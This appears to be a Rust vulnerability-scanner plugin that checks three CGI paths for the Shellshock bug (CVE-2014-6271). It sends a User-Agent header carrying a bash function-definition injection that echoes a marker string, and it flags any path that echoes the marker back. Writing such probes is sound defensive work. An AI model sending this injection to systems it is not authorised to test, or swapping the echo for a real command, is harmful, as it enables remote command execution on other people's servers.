/* http-vuln-cve2014-6271-3 - CVE-2014-6271 Shellshock probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/admin.cgi"];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None,
            "User-Agent: () { :;}; echo; /bin/echo ALMAP_SHELLSHOCK\r\n", "", None, 4096) {
            Some(r) => r,
            _ => String::new(),
        };
        if !resp.is_empty() && contains_ci(&resp, "ALMAP_SHELLSHOCK") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: CVE-2014-6271 Shellshock");
    }
    0
}
